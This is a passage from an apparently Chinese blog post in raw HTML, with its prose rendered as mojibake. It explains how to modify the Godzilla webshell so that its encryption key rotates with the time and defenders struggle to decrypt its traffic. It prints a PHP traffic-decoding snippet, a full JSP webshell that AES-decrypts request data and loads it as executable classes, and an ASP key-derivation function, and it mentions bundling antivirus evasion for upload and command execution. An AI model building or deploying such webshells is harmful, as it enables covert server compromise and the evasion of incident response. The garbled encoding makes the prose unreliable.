alt="image-20250106112904595"></p><p>ä¹Ÿå°±æ˜¯è¿™ä¸ªï¼Œä»–ä¼šå¾ˆå¤§ï¼Œä¸”å‘é€åŒ…ä¸æºå¸¦cookieã€‚æœåŠ¡å™¨ç«¯ä¼šç”Ÿæˆä¸€ä¸ªPHPSESSIDçš„å€¼ï¼Œæ¥å­˜å‚¨è¯·æ±‚çš„å¤§åŒ…ï¼Œè¿™ä¸ªè¯·æ±‚çš„å¤§åŒ…æ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬å¯ä»¥è§£å‡ºæ¥çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106144059303.png" alt="image-20250106144059303"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> gzdecode(encode(base64_decode(urldecode(<span class="string">&quot;fL1tMGI4YTljMn57Hn1UB6v7qeNJ8EnZKTDH/tKI4/eBVFWTRgtWLK0ZfB8cNRIzPu0bNVk4YTk=&quot;</span>)),<span class="variable">$key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> encode(base64_decode(urldecode(<span class="string">&quot;fL1tMGI4YTljMn57Hn1UB6v7qeNJ8EnZKTDH/tKI4/eBVFWTRgtWLK0ZfB8cNRIzPu0bNVk4YTk=&quot;</span>)),<span class="variable">$key</span>);</span><br></pre></td></tr></table></figure><p>ä»£ç å¤ªé•¿äº†ï¼Œç®€å•è¯´ä¸€ä¸‹ï¼Œå°±æ˜¯å„ç§åŠŸèƒ½çš„ä¸€äº›å‡½æ•°ï¼Œå¦‚æ–‡ä»¶è¯»å–ï¼Œåˆ›å»ºï¼Œå‘½ä»¤æ‰§è¡Œç­‰ç­‰å¾ˆå¤šã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠæ‰€æœ‰çš„åŠŸèƒ½å‚¨å­˜åˆ°ä¸€ä¸ªsessionä¸­ï¼Œåé¢æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œåœ¨è¿›è¡Œä¼ å‚å°±å¯ä»¥äº†ã€‚ç„¶åcloseæ‰ã€‚</p><p>è¿™æ˜¯ç‚¹å‡»æµ‹è¯•çš„æµç¨‹ã€‚</p><p>ä¸‹é¢æ˜¯æ‰§è¡Œå‘½ä»¤çš„æµç¨‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145104840.png" alt="image-20250106145104840"></p><p>å½“æˆ‘ä»¬ç‚¹å‡»è¿›å…¥åï¼Œä¼šæœ‰ä¸‰ä¸ªåŒ…</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145426293.png" alt="image-20250106145426293"></p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯ç‰¹åˆ«é•¿çš„åŒ…ï¼ŒåŒ…å«æ‰€æœ‰åŠŸèƒ½ï¼Œå­˜å‚¨åˆ°ä¸€ä¸ªsessionä¸­</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145741094.png" alt="image-20250106145741094"></p><p>ç„¶åå°±æ˜¯å‘é€æµ‹è¯•åŒ…ï¼Œæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œå°±æ˜¯å‘é€getBasicsInfoåŒ…è·å–åŸºæœ¬ä¿¡æ¯äº†ã€‚</p><p>è¿™é‡Œå°±æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå‡è®¾æˆ‘ä»¬åœ¨<code>06 January 2025 15:00</code>ç‚¹å‡»è¿›å…¥é¡µé¢ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106150249553.png" alt="image-20250106150249553"></p><p>é‚£ä¹ˆï¼Œå½“æˆ‘ä»¬ç‚¹å‡»è¿›å…¥é¡µé¢åï¼Œå°±ä¼šä½¿ç”¨<code>06 January 2025 15:00</code>çš„keyå»å¼‚æˆ–æ‰€æœ‰çš„åŠŸèƒ½çš„é‚£ä¸ªåŒ…ç„¶åå­˜å‚¨åˆ°sessionidä¸­ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå½“æ—¶é—´ä¸º<code>06 January 2025 15:01</code> æ—¶ï¼Œkeyå°±ä¼šå˜åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´æœ¨é©¬å˜äº†ã€‚è€Œè°ƒç”¨sessionidä¸­çš„åŠŸèƒ½çš„keyå˜åŒ–äº†ï¼Œæ‰€ä»¥è¿›å…¥çš„è¿™ä¸ªé¡µé¢å°±ä¸èƒ½ç”¨äº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œä¸èƒ½å®æ—¶çš„åŠ¨æ€keyäº†ã€‚é€€è€Œæ±‚å…¶æ¬¡ï¼Œç¬”è€…è¿™é‡Œé‡‡ç”¨ååˆ†é’Ÿä¸€æ¬¡å’Œ60åˆ†é’Ÿä¸€æ¬¡ã€‚</p><p>10min:æˆ‘ä»¬å°†keyè®¾ä¸º<code>06 January 2025 15:0</code>æ—¶ï¼Œé‚£ä¹ˆè¿™ä¸ªç»ˆç«¯å°±å¯ä»¥ä½¿ç”¨ååˆ†ã€‚æœ‰åŒå­¦é—®äº†ï¼Œå¦‚æœæ˜¯15ï¼š09è¿ä¸Šçš„ï¼Œèƒ½ç”¨å‡ åˆ†é’Ÿï¼Œæ˜¾ç„¶ï¼Œèƒ½ç”¨ä¸€åˆ†é’Ÿï¼Œä¸‹ä¸€åˆ†é’Ÿæ—¶é—´å˜æˆäº†<code>06 January 2025 15:1</code>ï¼Œå°±ä¸èƒ½ç”¨äº†ã€‚</p><p>60min:æˆ‘ä»¬å°†keyè®¾ä¸º<code>06 January 2025 15</code>æ—¶ï¼Œé‚£ä¹ˆè¿™ä¸ªç»ˆç«¯å°±å¯ä»¥ä½¿ç”¨ååˆ†ã€‚æœ‰åŒå­¦é—®äº†ï¼Œå¦‚æœæ˜¯15ï¼š50è¿ä¸Šçš„ï¼Œèƒ½ç”¨å‡ åˆ†é’Ÿï¼Œæ˜¾ç„¶ï¼Œèƒ½ç”¨10åˆ†é’Ÿï¼Œä¸‹10åˆ†é’Ÿæ—¶é—´å˜æˆäº†<code>06 January 2025 16</code>ï¼Œå°±ä¸èƒ½ç”¨äº†ã€‚</p><p>å¥½ï¼Œå¦‚æœä¸èƒ½ç”¨äº†åï¼Œæ€ä¹ˆå†æ¬¡ä½¿ç”¨ï¼Œå…¶å®å¾ˆç®€å•ï¼Œ<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154650833.png" alt="image-20250106154650833"></p><p>è¿™ä¸ªé¡µé¢ï¼Œå…³ä¸ä¸å…³éƒ½æ— æ‰€è°“ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154746122.png" alt="image-20250106154746122"></p><p>åªéœ€ä»æ–°ç‚¹å‡»è¿›å…¥å³å¯ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154815100.png" alt="image-20250106154815100"></p><p>æ¥ç€ç”¨ã€‚å¦‚æœå¤§å®¶æ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œå¦‚æœæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…æ‰«æäº†ä»€ä¹ˆï¼Œéƒ½ä¸å½±å“ï¼Œåªè¦ä¸å…³æ‰å³å¯ã€‚å…³æ‰äº†ä¹Ÿæ²¡äº‹ï¼Œå°±æ˜¯åœ¨æƒ³æˆªå›¾çš„æ—¶å€™ï¼Œå°±æˆªä¸åˆ°äº†ã€‚<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154853081.png" alt="image-20250106154853081"></p><p>tips:å½“æ‰§è¡Œå‘½ä»¤ï¼Œæ‰§è¡Œå®Œåï¼Œè¿”å›nullæˆ–è€…å•¥ä¹Ÿä¸è¿”å›ï¼Œå…ˆçœ‹æ—¶é—´æˆ–è€…ä»æ–°è¿›å…¥ä¸€æ¬¡ï¼Œå†æ€€ç–‘æ˜¯ä¸æ˜¯è¢«åº”æ€¥äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106155133587.png" alt="image-20250106155133587"></p><p>æ€•å½±å“åŒå­¦ä»¬çš„ä½¿ç”¨ä½“éªŒï¼Œååˆ†é’Ÿå°±è¦é€€å‡ºä¸€æ¬¡ï¼Œå¯èƒ½æœ‰ç‚¹é¢‘ç¹ï¼Œæ‰€ä»¥ç¬”è€…è¿™é‡Œä¹Ÿåšäº†60minçš„è¿‡æœŸæ—¶é—´ï¼Œå½“ç„¶å¦‚æœï¼Œæ°å·§åœ¨12ï¼š59åˆ†çš„è¯ï¼Œä¹Ÿæ²¡æœ‰åŠæ³•ï¼Œé‚£å°±ä»æ–°ç‚¹è¿›å…¥ä¸€ä¸‹å§ã€‚</p><p>æœ‰å°ä¼™ä¼´å¯èƒ½æœ‰ç–‘æƒ‘ï¼Œèƒ½ä¸èƒ½å†é•¿ä¸€ç‚¹æ—¶é—´ï¼Œå…¶å®æˆ‘æ˜¯ä¸å»ºè®®çš„ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå‡è®¾æˆ‘ä»¬è®¾ç½®äº†ä¸ªä¸€å¤©çš„ï¼Œé‚£ç¡®å®ä¸ç”¨ä¸€ç›´é€€å‡ºäº†ï¼Œä½†æ˜¯keyå°±ä¸å˜åŒ–äº†ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œè·ŸåŸæ¥çš„ä¸åŠ¨æ€keyåŠ å¯†æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«äº†ï¼Œè®¾æˆä¸€å¤©ï¼Œè¿˜ä¸å¦‚ç›´æ¥ç”¨å®šæ­»çš„keyï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰å®šä¹‰ä¸€å¤©çš„ã€‚æˆ‘ä»¬åšåŠ¨æ€keyçš„åˆè¡·å°±æ˜¯è®©è¿ç»´äººå‘˜ä¸å¥½è§£å¯†æˆ‘ä»¬çš„æµé‡æˆ–è€…è§£å¯†æµé‡éš¾ä¸€äº›ï¼Œå®šä¹‰ä¸€å¤©æµé‡è§£å¯†å˜å¾—ç®€å•äº†ï¼Œæ‰€ä»¥æš‚æ—¶å…ˆä¸åšå§ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106170342545.png" alt="image-20250106170342545"></p><p>å½“ç„¶ï¼Œå½“ä½ ä½¿ç”¨åŠ¨æ€keyçš„æœ¨é©¬åï¼Œå°±ä¸èƒ½ä½¿ç”¨è‡ªå·±çš„keyäº†ï¼Œåœ¨è¿æ¥æ—¶è¾“å…¥çš„keyä¹Ÿä¸èµ·ä½œç”¨äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250107102102047.png" alt="image-20250107102102047"></p><p>å¤§å®¶è®°å¾—ï¼Œç”¨çš„æ—¶å€™å…ˆå»ç”Ÿæˆå“¦ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå°äº‹ï¼Œå› ä¸ºæˆ‘ä»¬åŠ¨æ€keyçš„æœ¨é©¬è¿æ¥çš„æ—¶å€™ä¸éœ€è¦è¾“å…¥keyäº†ï¼Œç›¸åº”çš„ï¼Œåˆ«äººæœ‰å¯†ç å°±å¯ä»¥è¿æ¥ä½ çš„æœ¨é©¬ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨çš„æ—¶å€™ï¼Œå°½é‡æŠŠå¯†ç è®¾ç½®çš„å¤æ‚ä¸€äº›ï¼Œè‡ªå·±è¾›è¾›è‹¦è‹¦æ‰“çš„æˆæœåˆ«è®©äººå®¶ä¸Šäº†è½¦ã€‚</p><p>è¿™é‡Œå°±ä¸å†™ä»£ç è¿‡ç¨‹äº†ï¼Œå¤§å®¶ç›´æ¥ä¸‹è½½å°±å¥½äº†ã€‚</p><h5 id="jsp-å®ç°åŠ¨æ€å¯†é’¥ï¼ˆæš‚æœªå®ç°ï¼‰"><a href="#jsp-å®ç°åŠ¨æ€å¯†é’¥ï¼ˆæš‚æœªå®ç°ï¼‰" class="headerlink" title="jsp å®ç°åŠ¨æ€å¯†é’¥ï¼ˆæš‚æœªå®ç°ï¼‰"></a>jsp å®ç°åŠ¨æ€å¯†é’¥ï¼ˆæš‚æœªå®ç°ï¼‰</h5><p>ç”±äºç¬”è€…èƒ½åŠ›å¤ªèœï¼Œjspçš„æš‚æœªå®ç°ã€‚</p><p>ä¸ºä»€ä¹ˆæ²¡èƒ½å®ç°å‘¢ï¼Œå¤§æ¦‚å°±æ˜¯ï¼Œæœ¨é©¬åœ¨å£°æ˜æ ‡ç­¾&lt;%! %&gt;ä¸­å®šä¹‰äº†keyï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŠŠæ—¶é—´å®šä¹‰ä¸ºkeyåï¼Œkeyæ˜¯ä¸å˜åŒ–çš„ã€‚å½“è¿™ä¸ªæ–‡ä»¶è¢«åˆ›å»ºæ—¶ï¼Œå°±å®šæ­»äº†ã€‚æ‰€ä»¥è¾¾ä¸åˆ°åŠ¨æ€çš„ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250109105239865.png" alt="image-20250109105239865"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250109105251342.png" alt="image-20250109105251342"></p><p>æ— è®ºæ€ä¹ˆåˆ·æ–°ï¼Œéƒ½ä¸èƒ½æ”¹å˜ä¸Šé¢çš„æ—¶é—´äº†ã€‚åªæœ‰åœ¨&lt;%! %&gt;ä¸­å®šä¹‰æ‰å¯ä»¥ã€‚ä½†æ˜¯aesè§£å¯†åˆè§£ä¸äº†äº†ã€‚æš‚æ—¶è¿˜æ²¡ç ”ç©¶æ˜ç™½ï¼Œå…ˆæç½®æŠŠã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%! </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span></span>&#123;<span class="keyword">super</span>(z);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;String ret = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception </span>&#123;Class base64;String value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object Encoder = base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;Class base64;<span class="keyword">byte</span>[] value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object decoder = base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder = base64.newInstance(); value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">try</span>&#123;</span><br><span class="line">String pass=<span class="string">&quot;pass&quot;</span>;</span><br><span class="line">String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] dataa=base64Decode(request.getParameter(pass));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cipher c = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="comment">// Initialize for encryption (1) or decryption (2)</span></span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[] data = c.doFinal(dataa);  <span class="comment">// Encrypt the data</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 ç¼–ç çš„æ—¶é—´3: &quot; + data + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line"><span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="keyword">null</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session.setAttribute(<span class="string">&quot;payload&quot;</span>,<span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);</span><br><span class="line">java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 ç¼–ç çš„æ—¶é—´: &quot; + f + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">f.equals(arrOut);</span><br><span class="line">Cipher d = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    d.init(<span class="number">1</span>,<span class="keyword">new</span> SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="keyword">byte</span>[] data2 = d.doFinal(arrOut.toByteArray());  <span class="comment">// Decrypt the data</span></span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 ç¼–ç çš„æ—¶é—´: &quot; + arrOut + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line"> String sss=<span class="keyword">new</span> String(base64Decode(<span class="string">&quot;eyJtZXNzYWdlIjoi&quot;</span>));</span><br><span class="line">    String ddd=<span class="keyword">new</span> String(base64Decode(<span class="string">&quot;In0=&quot;</span>));</span><br><span class="line"></span><br><span class="line">f.equals(pageContext);</span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 ç¼–ç çš„æ—¶é—´: &quot; + pageContext + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">response.getWriter().write(sss);</span><br><span class="line">f.toString();</span><br><span class="line">response.getWriter().write(base64Encode(data2));</span><br><span class="line">response.getWriter().write(ddd);&#125; &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰å¤§ç‰›æ„Ÿå…´è¶£ï¼Œå¯ä»¥å¸®å¸®æˆ‘ï¼Œæ¬¢è¿ç•™è¨€ã€‚</p><h5 id="asp-å®ç°åŠ¨æ€å¯†é’¥"><a href="#asp-å®ç°åŠ¨æ€å¯†é’¥" class="headerlink" title="asp å®ç°åŠ¨æ€å¯†é’¥"></a>asp å®ç°åŠ¨æ€å¯†é’¥</h5><p>aspå’Œphpçš„å·®ä¸å¤šï¼Œ</p><p>æˆ‘ä»¬åŸç‰ˆçš„æœ¨é©¬ä¸­ï¼Œå¹¶ä¸å¸¦md5å‡½æ•°ï¼Œæˆ‘ä»¬è¦è·å–md5  è¿›è¡Œå®æ—¶åŠ å¯†ä¹ˆï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Function MD5(text)</span><br><span class="line">    With CreateObject(&quot;MSXML.DOMDocument&quot;).createElement(&quot;a&quot;)</span><br><span class="line">.dataType = &quot;bin.hex&quot;</span><br><span class="line">.nodeTypedvalue = CreateObject(&quot;System.Security.Cryptography.MD5CryptoServiceProvider&quot;).ComputeHash_2(CreateObject(&quot;System.Text.UTF8Encoding&quot;).GetBytes_4(text))</span><br><span class="line">MD5 = .text</span><br><span class="line">        End With</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šæ‰¾ä¸ªmd5åŠ å¯†ï¼Œå¯¹å–åˆ°çš„æ—¶é—´è¿›è¡Œmd5å°±å¯ä»¥äº†ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162516852.png" alt="image-20250110162516852"></p><p>å°±å¯ä»¥è·å–åˆ°keyäº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162801008.png" alt="image-20250110162801008"></p><p>åŒæ ·çš„ï¼Œ60åˆ†é’Ÿçš„ä¹Ÿåšå¥½äº†ã€‚</p><p>æˆ‘ä»¬é…åˆæˆ‘ä»¬çš„å…æ€ï¼Œä¸€èµ·å°è£…åˆ°godzillaé‡Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162854098.png" alt="image-20250110162854098"></p><p>ä½¿ç”¨çš„æ—¶å€™ï¼Œå…ˆè¿›è¡Œç”Ÿæˆ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162932114.png" alt="image-20250110162932114"></p><p>ä¸€ç§10minï¼Œä¸€ç§60minçš„ï¼Œç”Ÿæˆçš„æ—¶å€™ï¼Œkeyä¸ç”¨ç®¡ï¼Œå¡«å†™äº†keyï¼Œä¹Ÿä¸ç”Ÿæ•ˆäº†ã€‚</p><p>åªç”¨å¡«passï¼Œè®°å¾—è®¾å¤æ‚ä¸€ç‚¹ã€‚</p><p>ä¸Šä¼ ï¼Œä½¿ç”¨è¿æ¥å³å¯ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163028486.png" alt="image-20250110163028486"></p><p>è¿æ¥çš„æ—¶å€™ï¼Œé€‰æ‹©å³å¯ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163102386.png" alt="image-20250110163102386"></p><p>è¿›å…¥ã€‚æ‰§è¡Œå‘½ä»¤å³å¯ã€‚</p><p>aspå’Œphpçš„åˆ¤æ–­æ˜¯å¦æ—¶é—´åˆ°æœŸæœ‰ä¸€ä¸¢ä¸¢åŒºåˆ«ï¼Œå°±æ˜¯ï¼Œå¦‚æœåˆ°æ—¶é—´äº†ï¼Œä¸èƒ½ç”¨äº†ï¼Œä¸ä¼šæ˜¾ç¤ºç©ºï¼Œè€Œæ˜¯æ˜¾ç¤ºä¸€äº›ä¹±ç ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163246095.png" alt="image-20250110163246095"></p><p>æ²¡æœ‰å…³ç³»ï¼Œä»æ–°ç‚¹è¿›å…¥å³å¯ã€‚</p><p><img 